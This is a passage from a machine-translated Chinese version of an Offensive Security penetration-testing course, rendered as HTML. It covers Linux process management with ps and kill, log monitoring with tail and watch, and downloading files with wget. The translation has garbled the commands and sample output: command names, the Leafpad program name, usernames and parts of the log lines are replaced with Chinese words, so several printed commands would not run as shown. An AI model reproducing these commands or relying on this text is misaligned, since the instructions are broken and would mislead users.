<div style="position:absolute;top:79096;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 2 0 10:18 ?    </font></font></nobr></div>
<div style="position:absolute;top:79096;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 [rcu_sched]</font></font></nobr></div>
<div style="position:absolute;top:79113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:79132;left:255"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 62 列出当前运行的所有进程的常用 ps 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们上面使用</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ef</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 73</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项代表：</font></font></nobr></div>
<div style="position:absolute;top:79195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:79195;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 选择所有进程</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:79223;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">f </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 显示完整格式列表（UID、PID、PPID 等）</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在大量列表中找到我们的 Leafpad 应用程序绝对不容易，但由于我们知道</font></font></nobr></div>
<div style="position:absolute;top:79275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找的应用程序名称，我们可以</font><font style="vertical-align: inherit;">用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-C</font></font></b><font style="vertical-align: inherit;">替换</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开关</font><font style="vertical-align: inherit;">（通过命令选择</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:79294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称）如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps -fC 叶垫</font></font></font></b></nobr></div>
<div style="position:absolute;top:79346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户标识    </font></font></nobr></div>
<div style="position:absolute;top:79346;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID PPID C STIME TTY    </font></font></nobr></div>
<div style="position:absolute;top:79346;left:473"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间命令</font></font></nobr></div>
<div style="position:absolute;top:79363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利 1307 938 0 10:57 ?    </font></font></nobr></div>
<div style="position:absolute;top:79363;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 叶垫</font></font></nobr></div>
<div style="position:absolute;top:79400;left:253"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 63 - 通过指定进程名称缩小搜索范围</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 63 所示，进程搜索返回了我们收集的单个结果</font></font></nobr></div>
<div style="position:absolute;top:79448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Leafpad 的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">花点时间研究一下命令手册 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，因为 ps 真的是瑞士人</font></font></nobr></div>
<div style="position:absolute;top:79468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流程管理的军刀。</font></font></nobr></div>
<div style="position:absolute;top:79501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设我们现在想要停止 Leafpad 进程而不与 GUI 交互。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀</font></font></i></nobr></div>
<div style="position:absolute;top:79520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">command 在这里可以帮助我们，因为它的目的是向进程发送特定信号。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:79603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Process_identifier</font></font></font></nobr></div>
<div style="position:absolute;top:79623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（问 Ubuntu，2014） https://askubuntu.com/questions/484982/what-is-the-difference-between-standard-syntax-and-bsd-syntax</font></font></font></nobr></div>
<div style="position:absolute;top:79643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Signal_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(IPC)#POSIX_signals</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:79771;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="68"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 68 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:79804;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:80881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:80881;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:80881;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kill</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们需要我们想要向其发送信号的进程的 PID。</font><font style="vertical-align: inherit;">自从我们聚在一起</font></font></nobr></div>
<div style="position:absolute;top:79919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一步的Leafpad的PID，我们可以继续：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀死 1307</font></font></font></b></nobr></div>
<div style="position:absolute;top:79988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ ps aux | </font><font style="vertical-align: inherit;">grep叶垫</font></font></nobr></div>
<div style="position:absolute;top:80005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利 1313 0.0 0.0 6144 888 pts/0 S+ 10:59 0:00 grep 叶垫</font></font></nobr></div>
<div style="position:absolute;top:80024;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 64 - 通过发送 SIGTERM 信号停止 Leafpad</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为kill的默认信号是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SIGTERM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（请求终止），我们的应用程序已经</font></font></nobr></div>
<div style="position:absolute;top:80073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止。</font><font style="vertical-align: inherit;">这已在清单 64 中通过</font><font style="vertical-align: inherit;">在杀死 Leafpad 后</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行</font><font style="vertical-align: inherit;">了验证</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:80108;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 通过运行以下命令查找过去 7 天内 Kali 虚拟机上发生更改的文件</font></font></nobr></div>
<div style="position:absolute;top:80157;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台的特定命令。</font></font></nobr></div>
<div style="position:absolute;top:80185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2、重新运行之前的命令并挂起；</font><font style="vertical-align: inherit;">一旦暂停，背景它。</font></font></nobr></div>
<div style="position:absolute;top:80214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 将之前的后台作业带入前台。</font></font></nobr></div>
<div style="position:absolute;top:80242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 在 Kali 系统上启动 Firefox 浏览器。</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来识别 Firefox 的 PID。</font></font></nobr></div>
<div style="position:absolute;top:80270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 从命令行使用其 PID 终止 Firefox。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:80307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7 文件和命令监控</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解如何在课程中实时监控文件和命令是非常有价值的</font></font></nobr></div>
<div style="position:absolute;top:80369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试。</font><font style="vertical-align: inherit;">有助于完成此类任务的两个命令是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tail</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">watch</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:80403;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7.1 尾部</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tail </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常见的用途</font><font style="vertical-align: inherit;">是监视正在写入的日志文件条目。</font><font style="vertical-align: inherit;">例如，</font></font></nobr></div>
<div style="position:absolute;top:80460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可能想要监视 Apache 日志以查看给定客户端是否正在联系 Web 服务器</font></font></nobr></div>
<div style="position:absolute;top:80480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正试图通过客户端漏洞进行攻击。</font><font style="vertical-align: inherit;">这个例子将做到这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo tail -f /var/log/apache2/access.log</font></font></font></b></nobr></div>
<div style="position:absolute;top:80532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0</font></font></nobr></div>
<div style="position:absolute;top:80549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</font></font></nobr></div>
<div style="position:absolute;top:80566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] "GET /icons/openlogo-75.png HTTP/1.1" 200 6</font></font></nobr></div>
<div style="position:absolute;top:80582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">040 "http://127.0.0.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firef</font></font></nobr></div>
<div style="position:absolute;top:80599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">牛/52.0"</font></font></nobr></div>
<div style="position:absolute;top:80616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] "GET /favicon.ico HTTP/1.1" 404 500 "-" "Mo</font></font></nobr></div>
<div style="position:absolute;top:80633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</font></font></nobr></div>
<div style="position:absolute;top:80653;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 65 - 使用 tail 命令监视 Apache 日志文件。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项（如下）是非常有用，因为目标文件增长，因为它不断更新的输出。</font></font></nobr></div>
<div style="position:absolute;top:80702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个方便的开关是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-nX</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它输出最后的“X”行数，而不是默认值</font></font></nobr></div>
<div style="position:absolute;top:80721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值 10。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:80831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2010），https://linux.die.net/man/1/tail</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:80959;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="69"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 69 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:80992;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:82069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:82069;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:82069;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81088;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7.2 手表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">watch </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令用于定期运行指定的命令。</font><font style="vertical-align: inherit;">默认情况下，它运行</font></font></nobr></div>
<div style="position:absolute;top:81145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每两秒，但我们可以通过使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n X</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项来</font><font style="vertical-align: inherit;">指定不同的时间间隔</font><font style="vertical-align: inherit;">来让它运行</font></font></nobr></div>
<div style="position:absolute;top:81164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每“X”秒。</font><font style="vertical-align: inherit;">例如，此命令将列出登录用户（通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">w</font></font></font></b></nobr></div>
<div style="position:absolute;top:81184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令）每 5 秒一次：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">watch -n 5 w</font></font></font></b></nobr></div>
<div style="position:absolute;top:81253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">………………</font></font></nobr></div>
<div style="position:absolute;top:81287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每 5.0 秒：w    </font></font></nobr></div>
<div style="position:absolute;top:81287;left:514"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利：2018 年 1 月 23 日星期二 21:06:03</font></font></nobr></div>
<div style="position:absolute;top:81321;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21:06:03 up 7 days, 3:54, 1 user, load average: 0.18, 0.09, 0.03</font></font></nobr></div>
<div style="position:absolute;top:81338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 TTY 来自    </font></font></nobr></div>
<div style="position:absolute;top:81338;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录@空闲 JCPU PCPU 什么</font></font></nobr></div>
<div style="position:absolute;top:81355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利 tty2 :0    </font></font></nobr></div>
<div style="position:absolute;top:81355;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16Jan18 7days 16:29 2.51s /usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:81374;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 66 - 使用 watch 命令监控登录用户。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要终止 watch 命令并返回到交互式终端，请使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81438;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.启动你的apache2 web服务并在本地访问它，同时监控它的access.log文件</font></font></nobr></div>
<div style="position:absolute;top:81487;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即时的。</font></font></nobr></div>
<div style="position:absolute;top:81515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 结合使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">watch</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来监控你的 CPU 密集程度最高的进程</font></font></nobr></div>
<div style="position:absolute;top:81535;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端窗口中的 Kali 机器；</font><font style="vertical-align: inherit;">启动不同的应用程序以查看列表如何变化</font></font></nobr></div>
<div style="position:absolute;top:81554;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实时。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8 下载文件</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来我们来看看一些可以从命令下载文件到Linux系统的工具</font></font></nobr></div>
<div style="position:absolute;top:81653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81687;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.1 wget</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将广泛使用</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令使用 HTTP/HTTPS 和</font></font></nobr></div>
<div style="position:absolute;top:81744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 协议。</font><font style="vertical-align: inherit;">清单 67 显示了使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-O</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开关来保存目标</font></font></nobr></div>
<div style="position:absolute;top:81764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本地机器上具有不同名称的文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget -O report_wget.pdf https://www.offensive-security.com/reports/penetr</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:81815;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ation-testing-sample-report-2013.pdf</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--2018-01-28 20:30:04-- https://www.offensive-security.com/reports/penetration-testin</font></font></nobr></div>
<div style="position:absolute;top:81850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在解析 www.offensive-security.com (www.offensive-security.com)... 192.124.249.5</font></font></nobr></div>
<div style="position:absolute;top:81867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:4</font></font></nobr></div>
<div style="position:absolute;top:81883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 请求已发送，正在等待响应... 200 OK</font></font></nobr></div>
<div style="position:absolute;top:81900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">长度：27691955（26M）【申请/pdf】</font></font></nobr></div>
<div style="position:absolute;top:81917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存到：'report_wget.pdf'</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:81999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，1999），https://linux.die.net/man/1/watch</font></font></font></nobr></div>
<div style="position:absolute;top:82019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2018），https://www.gnu.org/software/wget/manual/wget.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:82147;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="70"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 70 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:82180;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:83257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
